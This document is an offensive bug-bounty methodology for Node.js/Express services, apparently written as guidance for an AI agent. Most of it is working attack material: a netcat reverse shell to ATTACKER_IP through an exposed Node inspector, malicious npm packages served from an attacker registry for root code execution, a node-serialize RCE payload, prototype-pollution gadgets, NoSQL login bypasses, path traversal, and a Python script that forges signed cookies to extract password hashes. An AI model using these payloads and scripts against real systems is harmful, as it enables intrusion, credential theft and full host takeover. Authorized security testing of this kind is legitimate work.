---
technology: "Node.js / Express"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
version: "1.0"
provenance: "corpus-grounded (11 chains: --inspect 9229 takeover; lodash merge pollution to root; nunjucks raw-block pollution + per-route json limit; Electron asar + canUpload pollution; NoSQL bypass + node-serialize IIFE; Verdaccio registry poisoning + sudo npm; cookie-session sig + LFI to package.json; body-parser stack leak + NoSQL; NODE_PATH hijack; X-Powered-By + LFI; local npm build analysis) + upstream-verified (Express behind-proxies + security best-practices docs, Node inspector API docs, NVD CVE-2024-45590, CVE-2024-45296, CVE-2018-16487, CVE-2017-5941). Companion overview: [[node-express|Node.js / Express]]."
---

# Node.js / Express bug bounty methodology

Target model: a Node.js HTTP service, usually Express (often behind nginx), sometimes
embedded in an Electron desktop app or a CI/CD host. Authorization assumed.

Scope discipline: **Express-shaped** surface only — fingerprinting, middleware order,
parser limits, proxy trust, prototype pollution, the inspector, npm supply chain, and
Node template/serialization engines. Plain logic bugs in handlers are generic web-app
material; the framework only changes how they're delivered.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Prototype pollution (merge/deep-copy sink) | `__proto__` write + observable effect | often | Authz bypass → RCE (gadget-dependent) — Critical |
| Node inspector on 9229 reachable | `--inspect` in cmdline/env + tunnel or bind 0.0.0.0 | no auth | Full JS code exec as app user — Critical |
| npm package poisoning | root/cron runs `npm install`; registry control | host access | Root RCE — Critical |
| NoSQL operator injection in JSON login | Mongo/Mongoose + JSON body | yes | Auth bypass — High |
| trust proxy + client X-Forwarded-For | `true` w/o header strip | yes | IP spoofing: rate-limit/log/allowlist bypass — Medium |
| body-parser / path-to-regexp DoS | vulnerable versions in package.json | yes | Event-loop starvation — Medium-High |
| node-serialize unserialize on cookie | dependency present | yes | IIFE RCE — Critical (CVE-2017-5941) |
| ORM operator injection (Prisma/Sequelize where) | JSON body/session object reaching a SQL ORM query | often | Blind data exfil incl. password hashes — High |

## Phase 0 — Fingerprint

### 0.1 Wire signatures

```bash
nmap -sV -p 3000,5000 198.51.100.10
# 3000/tcp open http Node.js (Express middleware)   → express-family, port 3000 idiomatic
curl -si http://198.51.100.10/ | egrep -i 'x-powered-by|etag|set-cookie'
# X-Powered-By: Express          → on by default; disabled = a hardened build
# ETag: W/"1f8-..."              → weak validator, Express/send default style
# Set-Cookie: download_session=...; download_session.sig=...  → cookie-session pair
```

- The `name` + `name.sig` cookie pair is cookie-session's integrity signature — the
  secret to steal is in source (one observed engagement recovered it, and padding-stripping
  behavior, from app code).
- Trigger a parse error (send malformed JSON) and read the 500: body-parser/raw-body
  stack frames print absolute paths like `/var/www/dev/node_modules/body-parser/lib/...`
  (field-observed) — webroot + package layout in one response.

### 0.2 Content-type behavior

Express parses `application/json` and urlencoded by explicit middleware. Send both
representations at the same endpoint; a JSON-only handler is your NoSQL/operator
injection doorway (Phase 5), urlencoded-only suggests form APIs.

## Phase 1 — package.json-driven recon (when source leaks)

Any read primitive (LFI, git exposure, directory listing, Electron `.asar`) goes
straight to the predictable files:

```bash
curl --path-as-is 'http://198.51.100.10/static/../package.json'
curl --path-as-is 'http://198.51.100.10/static/../app.js'      # or index.js / server.js
```

- `package.json` → dependency list with versions → `npm audit` / CVE matching
  (one observed engagement: author field = SSH username; another matched
  next/next-auth versions).
- `app.js`/`server.js` → routing, middleware order, hidden endpoints, hardcoded
  secrets (observed: cookie secret `UHC-SecretCookie` in plain sight).
- **Replicate locally** for dynamic analysis: `npm install` the same versions and run
  the app (two observed engagements) — breakers work better on your copy.

Electron targets: `asar extract app.asar out/` after `npm install -g asar`, then
read the packaged `package.json` and the Node API it talks to (observed Electron target).

## Phase 2 — Middleware order and parser configuration

Middleware executes in registration order; security posture = that order.

```javascript
// VULNERABLE — static before auth: /public/../package.json is served, then parsed
app.use(express.static('public'));
app.use(auth);
// SECURE — auth first; parsers scoped to the routers that need them
app.use(auth);
app.use('/api', express.json({ limit: '1mb' }));
```

Checks:
- **Static + traversal**: try `../` against every static mount; send `--path-as-is`.
- **Parser limits**: global vs per-route (`router.post('/x', express.json({limit:'32kb'}), ...)`
  is legal — field-observed). Default body limits are ~100kb; large-file abuse lives
  where a route *raised* the limit (uploads) — probe with sized bodies, note 413s.
- **Error handler position**: a stack-leaking error middleware is itself a finding.

## Phase 3 — Proxy trust and X-Forwarded-* spoofing

Upstream semantics (Express `trust proxy` setting, verified):
- `false` (default): client IP = `req.socket.remoteAddress`.
- `true`: client IP = **left-most** `X-Forwarded-For` entry — attacker-controlled
  unless the trusted proxy strips/overwrites `X-Forwarded-For`, `-Host`, `-Proto`.
- IP/subnet list or hop count: walk `X-Forwarded-For` right-to-left skipping trusted hops.

Effects when spoofable: `req.ip`/`req.ips` (rate limits, lockouts, IP allowlists),
`req.hostname` (via `X-Forwarded-Host`), `req.protocol` (via `X-Forwarded-Proto` —
secure-cookie and absolute-URL decisions).

Probe order: forge `X-Forwarded-For: 198.51.100.99` → does a reflected "your IP" change?
Does a rate-limited endpoint reset? Does `X-Forwarded-Proto: https` flip a redirect?

## Phase 4 — Prototype pollution (the Express-native RCE ladder)

### 4.1 Sink inventory

Any endpoint that recursively merges or deep-copies JSON into an options/config
object: `_.merge`/`_.defaultsDeep` (lodash <4.17.11, CVE-2018-16487), merge utilities
in controllers, JSONPath/override parameters (an observed template "overrides" parameter),
Electron IPC bridges.

### 4.2 Detect

```bash
curl -X POST http://198.51.100.10/api/messages -H 'content-type: application/json' \
  -d '{"text":"x","__proto__":{"polluted":"yes"}}'
# readback anywhere: {"polluted":"yes"} appearing on an unrelated object = confirmed
```

### 4.3 Gadget chains (field-proven)

| Gadget | Effect | Observed |
|---|---|---|
| `user.canUpload`/`canUpdate` flag | pass `if (!user.canUpload)` authz checks | field-proven (authz flip) |
| `__proto__.shell` on exec'd options | `child_process.exec` runs `/home/user/fakeshell` as root | field-proven (root) |
| `__proto__.allowRawBlocks` | re-enables raw LaTeX blocks in nunjucks→pandoc render (file read) | field-proven (file read) |
| `nodeOptions`/`NODE_OPTIONS` style env pollution | spawn-time flag injection (audit locally) | — |

Then pair the pollution with any command-exec-adjacent feature (upload handler calling
`exec` on a filename — field-observed) to convert flag-flip → shell.

### 4.4 Deserialization sibling

`node-serialize`'s `unserialize()` executes IIFEs in the serialized object —
CVE-2017-5941, **no patched version** (≤0.0.4, recommendation is never feed it
untrusted input). Observed chain: URL-encoded JSON cookie →
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',...)}()"}` style
payload on the `c` cookie. Any cookie/body that looks like serialized JS is this finding.

## Phase 5 — NoSQL operator injection (JSON bodies into Mongo)

Express + Mongoose is the default stack; send operators where a string is expected:

```bash
curl -X POST http://198.51.100.10/login -H 'content-type: application/json' \
  -d '{"user":"admin","pass":{"$ne":"x"}}'        # observed pattern
# variations: {"$gt":""}, {"$regex":"^a"}, username as object too
```

A successful bypass returns the logged-in 302. Also test registration/search fields —
operator injection in a query parameter leaks data without ever authenticating.

## Phase 6 — The Node inspector (9229)

Discovery:
- Host foothold: `ps aux | grep inspect`, `/proc/<pid>/cmdline`, and **environment
  dumps** — `npm_lifecycle_script` showed `node --inspect=127.0.0.1:9229 start.js`
  in an observed env-var read.
- Remote: `nmap -p 9229`; the inspector binds loopback by default, so on-box reach
  (or an SSRF/tunnel that terminates locally) is the normal path — one observed chain
  forwarded 9229 over SFTP's port-forwarding.

Exploitation (observed chain): open `chrome://inspect`, add the forwarded host:port,
"inspect" the target, and evaluate in the console —

```javascript
(function(){ require('child_process').spawn('sh', ['-c', 'nc ATTACKER_IP 4444 -e /bin/sh']); })();
```

— arbitrary JS in the process, no authentication in the protocol. `node:inspector`
API docs confirm the debugger's role; treat any reachable 9229 as RCE-equivalent.

## Phase 7 — npm supply chain on the host

- **Private registries** (Verdaccio on :4873): `npm search`/`npm install
  --registry=http://127.0.0.1:4873` enumerate; packages may hold hardcoded creds or
  be publishable by you (field-observed).
- **Root-run installers**: a sudo/cron script running `npm install` executes package
  lifecycle scripts as root. Ubuntu's pre-19.10 sudo preserved `$HOME`, so *your*
  `~/.npmrc` (pointing at ATTACKER_IP's registry) is honored — publish a malicious
  package, run the script, get root (field-proven).
- **Module resolution hijack**: resolution walks `./node_modules` up every parent
  directory before `NODE_PATH`/globals — a writable parent dir on a script's path
  wins (one observed chain planted `/opt/sysadmin/node_modules/ws/index.js`).
- **`.tar.gz` + setup.py-style tricks** port to npm: `npm install` of your URL runs
  your scripts — anywhere an app pulls packages by name/URL, you have code exec.

## Phase 8 — Template engines and renderers

- **nunjucks/ejs/pug**: `autoescape: true` is the default posture (field-observed); SSTI is rare — but engine *options* objects are merge sinks (Phase 4).
- Rendered HTML→PDF/DOCX features (field-observed): HTML injection into the document
  is file read on the server (`<iframe src="file:///etc/passwd">` in the print view).
- **socket.io**: downgrade transports to `["polling"]` client-side to turn websockets
  into plain HTTP you can proxy/replay (field-observed).

## Phase 9 — Deployment notes

- `app.listen(port, '127.0.0.1')` under `NODE_ENV=production` (field-observed): the
  Express port is loopback-only behind nginx — SSRF or the front-end proxy is the
  route in; systemd units carry `Environment=DATABASE_URL=...` secrets worth reading.
- systemd `ExecStart=/usr/bin/node app.js` as `www-data`: process compromise is
  www-data first; root comes from Phase 7 gadgets or adjacent services.

## Phase 10 — ORM operator injection (Prisma/Sequelize into SQL)

When a JSON object reaches a SQL ORM's `where` clause unfiltered, object keys
stop being data and become **query operators**. Two delivery shapes:

- **JSON body** passed straight into a query —
  `Model.findAll({ where: req.body })` (the Sequelize classic).
- **Session object** — cookie-session stores the whole session as the `name`
  cookie with an `name.sig` HMAC-SHA1 companion (Keygrip semantics, base64url
  with `=` padding stripped, signature over `name=value`). Recover the
  `keys` secret from source (Phase 1 file reads) and every key of the session
  object is yours to shape. The Prisma shape that pays:
  `client.model.findMany({ where: { author: req.session.user } })` — the
  attacker controls the entire nested user object.

Identify the SQL backend from dialect tells in leaked source before
blind-testing operators: `COPY (SELECT ...) TO '/path' WITH (FORMAT csv)`
inside a `$executeRawUnsafe` call is PostgreSQL-distinctive, and a systemd
`Environment=DATABASE_URL=postgresql://...` unit confirms it.

```python
# Prisma operator extraction — startsWith is a documented string filter,
# so {"password": {"startsWith": "f8"}} filters on the hash prefix.
import requests, json, base64, hmac

URL    = "http://198.51.100.10/home/"
SECRET = b"<recovered cookie-session key>"     # keys: [...] from app.js

def sig(s):   # cookie-session signs "name=value"; base64url, '=' stripped
    return base64.urlsafe_b64encode(
        hmac.new(SECRET, s.encode(), "sha1").digest()).decode().rstrip("=")

def cookies(data):
    c = base64.b64encode(json.dumps(data).encode()).decode()
    return {"download_session": c,
            "download_session.sig": sig(f"download_session={c}")}

known = ""
for _ in range(32):                       # MD5 hex digest length
    for ch in "0123456789abcdef":
        r = requests.get(URL, cookies=cookies(
            {"user": {"id": 1, "password": {"startsWith": known + ch}}}))
        if "No files found" not in r.text: # matching prefix -> rows render
            known += ch
            print("hash:", known)
            break
# hash: f88976c10af66915918945b9679b2bd3    <- then crack offline (Phase 5 loot rules)
```

The oracle is any content difference between a matching and non-matching
query — the file list rendering versus the empty state. Keep payloads
type-valid: a malformed operator fails the query and renders the empty state
exactly like a non-match, destroying the oracle.

Sequelize sibling: operator keys (`$or`, nested `$like`-style conditions)
inside a JSON body that reaches `where` build boolean queries the developer
never wrote — auth-bypass OR-logic and blind extraction on `password`
columns. Modern Sequelize gates operators behind `Op` symbols with string
aliases disabled by default, so `$`-keys that still shift responses indicate
an old deployment or an explicit operator-alias re-enable.

## Command quick reference

```bash
# fingerprint
curl -si http://198.51.100.10:3000/ | egrep -i 'x-powered-by|etag|set-cookie'
curl -s -X POST http://198.51.100.10:3000/api -H 'content-type: application/json' -d '{bad' # stack-path leak
# source hunt
curl --path-as-is 'http://198.51.100.10/static/../package.json'
# pollution readback
curl -X POST http://198.51.100.10/api/cfg -H 'content-type: application/json' -d '{"__proto__":{"x":"pwn"}}'
# nosql
curl -X POST http://198.51.100.10/login -H 'content-type: application/json' -d '{"u":"admin","p":{"$ne":"1"}}'
# inspector (after tunneling 9229 locally)
curl -s http://127.0.0.1:9229/json
```

## Tooling (prose)

npm itself is the recon weapon (`npm search`/`install --registry`, `npm audit`
against a leaked package.json); asar extracts Electron bundles; curl drives JSON
operator injection; chrome://inspect is the inspector client; socket.io clients can
force polling for proxyable HTTP. Tools live in the tools vault.

## Verified CVE quick table

| CVE | Package | Versions | Class |
|---|---|---|---|
| CVE-2024-45590 | body-parser | <1.20.3 | URL-encoded-body DoS (CWE-405 amplification) |
| CVE-2024-45296 | path-to-regexp | <0.1.10; >=0.2.0<8.0.0 | regex backtracking → event-loop DoS (two params in one segment, non-period separator) |
| CVE-2018-16487 | lodash | <4.17.11 | prototype pollution in merge (an observed root chain) |
| CVE-2017-5941 | node-serialize | ≤0.0.4 (no fix) | unserialize IIFE RCE (observed) |

## References

- Express docs: behind-proxies (`trust proxy` semantics + strip-header warning),
  production security best practices.
- Node.js `node:inspector` API docs; debugging docs.
- NVD/GHSA records for the four CVEs above.
- Observed engagements: 12 gated (full ledger in
  internal coverage ledger).
